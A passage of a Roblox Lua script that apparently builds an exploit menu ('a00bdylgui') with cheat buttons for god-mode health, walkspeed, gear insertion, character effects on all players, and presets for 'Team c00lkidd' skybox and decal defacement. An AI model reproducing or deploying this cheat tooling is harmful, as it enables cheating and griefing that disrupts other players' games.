	y.StudsOffset = Vector3.new(0,1,0)
	y.Parent = game.Players[plr].Character.Head
	y.Adornee = game.Players[plr].Character.Head
	f = Instance.new("TextLabel")
	f.Parent = y
	f.BackgroundTransparency = 1
	f.Position = UDim2.new(0,0,0,-50)
	f.Size = UDim2.new(0,100,0,100)
	f.Font = "Arial"
	f.FontSize = "Size48"
	f.Text = frame.Settings.Page1["Billboard Gui Text"].TextBox.Text
	f.TextStrokeColor3 = Color3.new(0,0,0)
	f.TextColor3 = Color3.new(frame.Settings.Page2["Billboard Gui Color"].TextBox1.Text/255,frame.Settings.Page2["Billboard Gui Color"].TextBox2.Text/255,frame.Settings.Page2["Billboard Gui Color"].TextBox3.Text/255)
	f.TextStrokeTransparency = 0
	f.TextYAlignment = "Bottom"
end)
--

--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Chicken Arms"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Chicken Arms"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local Chicken = game.Players.LocalPlayer.Name
	game.Workspace[Chicken].Torso["Left Shoulder"].C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
	game.Workspace[Chicken].Torso["Left Shoulder"].C1 = CFrame.new(0, 0.5, 0)
	game.Workspace[Chicken].Torso["Right Shoulder"].C0 = CFrame.new(1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0) * CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * CFrame.fromEulerAnglesXYZ(0,-math.pi/2,0)
	game.Workspace[Chicken].Torso["Right Shoulder"].C1 = CFrame.new(0, 0.5, 0)
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Disco Character"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Disco Character"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
	while true do
		wait(0.5)
		ye = game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()
		for i,v in pairs(ye) do
			if v.className == "Part" then
				v.BrickColor = BrickColor.new(presets[math.random(1,#presets)])
			end
		end
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Dominus Ghost"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Dominus Ghost"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	function nob(who,tra,hat)
		c=who.Character
		pcall(function()u=c["Body Colors"]
			u.HeadColor=BrickColor.new("Black")
			u.LeftLegColor=BrickColor.new("Black")
			u.RightLegolor=BrickColor.new("Black")
			u.LeftArmColor=BrickColor.new("Black")
			u.TorsoColor=BrickColor.new("Black")
			u.RightArmColor=BrickColor.new("Black")
		end)
		pcall(function()c.Shirt:Destroy() c.Pants:Destroy() end)
		for i,v in pairs(c:GetChildren()) do
			if v:IsA("BasePart") then
				v.Transparency=tra
				if v.Name=="HumanoidRootPart" or v.Name=="Head" then
					v.Transparency=1
				end
				wait()
				v.BrickColor=BrickColor.new("Black")
			elseif v:IsA("Hat") then
				v:Destroy()
			end
		end
		xx=game:service("InsertService"):LoadAsset(hat)
		xy=game:service("InsertService"):LoadAsset(47433)["LinkedSword"]
		xy.Parent=who.Backpack
		for a,hat in pairs(xx:children()) do
			hat.Parent=c
		end
		xx:Destroy()
		h=who.Character.Humanoid
		h.MaxHealth=50000
		wait(1.5)
		h.Health=50000
		h.WalkSpeed=32
	end
	nob(game.Players.LocalPlayer,0.6,21070012)
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Floating Pad"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Floating Pad"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local name = game.Players.LocalPlayer.Name

	local p = Instance.new("Part")
	p.Parent = workspace
	p.Locked = true
	p.BrickColor = BrickColor.new("White")
	p.BrickColor = BrickColor.new(104)
	p.Size = Vector3.new(8, 1.2, 8)
	p.Anchored = true
	local m = Instance.new("CylinderMesh")
	m.Scale = Vector3.new(1, 0.5, 1)
	m.Parent = p
	while true do
		p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
		wait()
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Head Shake"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Head Shake"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	for X = 1, math.huge, 0.2 do 
		wait() 
		game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(math.sin(X) / 1,1.5,0) 
		game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
	end 
	for X = 1, math.huge, 0.1 do 
		wait() 
		game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C0 = CFrame.new(0,1.5,0) * CFrame.fromAxisAngle(Vector3.new(0,1,0), X) 
		game.Workspace[game.Players.LocalPlayer.Name].Torso.Neck.C1 = CFrame.new(0,0,0) 
	end 
	for _,c in pairs(game.Players:GetChildren()) do
		c.Character.Head.Mesh.Scale = Vector3.new(100, 100, 100)
	end
	for _,c in pairs(game.Players:GetChildren()) do
		c.Character.Head.Mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Heal"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Heal"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.MaxHealth		
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Mesh Disco"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Mesh Disco"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	plr = game.Players.LocalPlayer.Name
	meshes = {"Brick","Cylinder","Head","Sphere","Torso","Wedge"}
	h = game.Workspace[plr].Head.Mesh
	t = Instance.new("SpecialMesh",game.Workspace[plr].Torso)
	la = Instance.new("SpecialMesh",game.Workspace[plr]["Left Arm"])
	ra = Instance.new("SpecialMesh",game.Workspace[plr]["Right Arm"])
	ll = Instance.new("SpecialMesh",game.Workspace[plr]["Left Leg"])
	rl = Instance.new("SpecialMesh",game.Workspace[plr]["Right Leg"])
	while true do
		wait(0.1)
		h.MeshType = meshes[math.random(1,#meshes)]
		h.Parent.BrickColor = BrickColor.Random()
		t.MeshType = meshes[math.random(1,#meshes)]
		t.Parent.BrickColor = BrickColor.Random()
		la.MeshType = meshes[math.random(1,#meshes)]
		la.Parent.BrickColor = BrickColor.Random()
		ra.MeshType = meshes[math.random(1,#meshes)]
		ra.Parent.BrickColor = BrickColor.Random()
		ll.MeshType = meshes[math.random(1,#meshes)]
		ll.Parent.BrickColor = BrickColor.Random()
		rl.MeshType = meshes[math.random(1,#meshes)]
		rl.Parent.BrickColor = BrickColor.Random()
	end	
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Set Walkspeed"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Set Walkspeed"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = frame.Settings.Page2["Walkspeed Amount"].TextBox.Text	
end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.48,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,231)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = localp
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,231)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
local title = Instance.new("TextLabel")
title.Parent = misc
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Misc."
title.TextColor3 = whit
local title = Instance.new("TextLabel")
title.Parent = localp
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "LocalPlayer"
title.TextColor3 = whit
-- Page 3 End --
-- Page 4 --
button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Chop Suey"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Chop Suey"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Music ID"].TextBox.Text = 147407900
end)
--
button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Electro Sp00k"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Electro Sp00k"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Music ID"].TextBox.Text = 142930454	
end)
--
button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Scream"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Scream"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Music ID"].TextBox.Text = 138097458	
end)
--
button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Wonga"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Wonga"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Music ID"].TextBox.Text = 147909316	
end)
--
button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 3
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pmi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true

-- Preset Images --
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Team c00lkidd Logo 1"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Team c00lkidd Logo 1"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 158118263	
end)
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Team c00lkidd Logo 2"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Team c00lkidd Logo 2"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 164661730	
end)
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Thomas"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Thomas"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 160456772	
end)
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "c00lkidd"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "c00lkidd"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 157755295	
end)
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "team skrubl0rd"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "old team skrubl0rd"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text = 358313209
end)
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.48,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,231)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = psd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,231)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true

local title = Instance.new("TextLabel")
title.Parent = pmi
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Preset Music IDs"
title.TextColor3 = whit
title.TextWrapped = true
local title = Instance.new("TextLabel")
title.Parent = psd
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Preset Skybox/Decal IDs"
title.TextColor3 = whit
--page 5--
local t3xt = Instance.new("TextLabel")
t3xt.Parent = edn
t3xt.BackgroundColor3 = blak
t3xt.BorderColor3 = rede
t3xt.BorderSizePixel = 3
t3xt.Name = "Empty"
t3xt.Position = UDim2.new(0,0,0,0)
t3xt.Size = UDim2.new(1,0,1,0)
t3xt.ZIndex = 2
t3xt.Font = tef
t3xt.FontSize = "Size14"
t3xt.Text = "Thank you for using a00bdylgui scripted! Addons coming soon! Post Ideas in the Thread!!!"
t3xt.TextColor3 = whit
t3xt.TextWrapped = true
t3xt.TextYAlignment = "Top"

-- Preset Gear IDs --
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Airstrike"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Airstrike"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 88885539
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Dual Darkhearts"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Dual Darkhearts"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 108149175
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Dual Venomshanks"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Dual Venomshanks"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 158069180
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Ghostfire Sword"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Ghostfire Sword"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 64220933	
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Gravity Coil"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Gravity Coil"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 16688968
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Hyperbike"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Hyperbike"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 130113061	
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Icedagger"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Icedagger"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 83704165
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Linked Sword"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Linked Sword"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	frame.Settings.Page1["Custom Gear ID"].TextBox.Text = 125013769		
end)
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.48,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--
local button = Instance.new("TextButton")
button.Parent = pgi
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0,0,0,231)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.TextWrapped = true
--



--Settings--
local pge1 = Instance.new("Frame")
pge1.Parent = page
pge1.BorderColor3 = rede
pge1.BackgroundColor3 = blak
pge1.BorderSizePixel = 3
pge1.Name = "Page1"
pge1.Position = UDim2.new(0,0,0,83)
pge1.Size = UDim2.new(1,0,1,-83)
